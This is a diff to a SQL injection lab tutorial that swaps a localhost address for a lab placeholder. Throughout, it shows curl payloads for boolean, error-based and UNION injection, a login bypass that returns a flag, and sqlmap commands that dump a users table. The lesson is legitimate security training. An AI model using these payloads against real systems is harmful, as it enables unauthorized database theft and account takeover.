@@ -68,7 +68,10 @@ SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = '...'
 ```bash
 cd sqli-basics/lab
 docker compose up -d
-# Lab at: http://localhost:7104
+
+> 💡 **Get Lab Link:** Open this lesson on **Learning Detail** → click **"Access Lab"** to get the real link (e.g., `https://vuln.ghedahaui.online/labs-env/...`). Replace `<LAB_ADDRESS>` with that link in commands below.
+
+# Lab at: <LAB_ADDRESS>
 ```
 
 The lab is a login page + a product search page, both concatenating strings straight into SQL (MySQL).
@@ -80,17 +83,17 @@ The lab is a login page + a product search page, both concatenating strings stra
 Search products normally:
 
 ```bash
-$ curl -s "http://localhost:7104/search.php?q=phone"
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone"
 ```
 
 Now add payloads — if `q=phone' AND 1=1-- -` still shows results, but `q=phone' AND 1=2-- -` shows none → **definitely SQLi**:
 
 ```bash
 # Expected: shows phone products (AND 1=1 true)
-$ curl -s "http://localhost:7104/search.php?q=phone' AND 1=1-- -"
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' AND 1=1-- -"
 
 # Expected: shows nothing (AND 1=2 false)
-$ curl -s "http://localhost:7104/search.php?q=phone' AND 1=2-- -"
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' AND 1=2-- -"
 ```
 
 
@@ -103,7 +106,7 @@ When the app shows DB errors, force it to leak the version:
 
 ```bash
 # Force MySQL to error with the version included
-$ curl -s "http://localhost:7104/search.php?q=phone' AND extractvalue(1,concat(0x7e,version()))-- -"
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' AND extractvalue(1,concat(0x7e,version()))-- -"
 ERROR: XPATH syntax error: '~8.0.35'
 ```
 
@@ -116,10 +119,10 @@ ERROR: XPATH syntax error: '~8.0.35'
 Union needs the **exact column count**. Try `ORDER BY` step by step:
 
 ```bash
-$ curl -s "http://localhost:7104/search.php?q=phone' ORDER BY 1-- -"   # ok
-$ curl -s "http://localhost:7104/search.php?q=phone' ORDER BY 2-- -"   # ok
-$ curl -s "http://localhost:7104/search.php?q=phone' ORDER BY 3-- -"   # ok
-$ curl -s "http://localhost:7104/search.php?q=phone' ORDER BY 4-- -"   # ERROR → 3 columns
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' ORDER BY 1-- -"   # ok
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' ORDER BY 2-- -"   # ok
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' ORDER BY 3-- -"   # ok
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' ORDER BY 4-- -"   # ERROR → 3 columns
 ```
 
 
@@ -131,13 +134,13 @@ SELECT id, name, price FROM products WHERE name = 'phone' UNION SELECT 1, 2, 3--
 ```
 
 ```bash
-$ curl -s "http://localhost:7104/search.php?q=phone' UNION SELECT 1,2,3-- -"
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' UNION SELECT 1,2,3-- -"
 ```
 
 Column 2 renders `2` → replace it with data you want. Grab database name + version:
 
 ```bash
-$ curl -s "http://localhost:7104/search.php?q=phone' UNION SELECT database(),version(),3-- -"
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' UNION SELECT database(),version(),3-- -"
 ```
 
 
@@ -149,7 +152,7 @@ $ curl -s "http://localhost:7104/search.php?q=phone' UNION SELECT database(),ver
 Back at login, sign in with no password:
 
 ```bash
-$ curl -s "http://localhost:7104/login.php" -X POST -d "user=admin' OR 1=1-- -&pass=x"
+$ curl -s "<LAB_ADDRESS>/login.php" -X POST -d "user=admin' OR 1=1-- -&pass=x"
 Welcome admin! FLAG=FLAG{sql1_m4st3r_2026}
 ```
 
@@ -159,9 +162,9 @@ Welcome admin! FLAG=FLAG{sql1_m4st3r_2026}
 
 ```bash
 # Scan & dump the whole database automatically
-sqlmap -u "http://localhost:7104/search.php?q=phone" --batch --dbs
-sqlmap -u "http://localhost:7104/search.php?q=phone" --batch -D lab_db --tables
-sqlmap -u "http://localhost:7104/search.php?q=phone" --batch -D lab_db -T users --dump
+sqlmap -u "<LAB_ADDRESS>/search.php?q=phone" --batch --dbs
+sqlmap -u "<LAB_ADDRESS>/search.php?q=phone" --batch -D lab_db --tables
+sqlmap -u "<LAB_ADDRESS>/search.php?q=phone" --batch -D lab_db -T users --dump
 ```
 
 
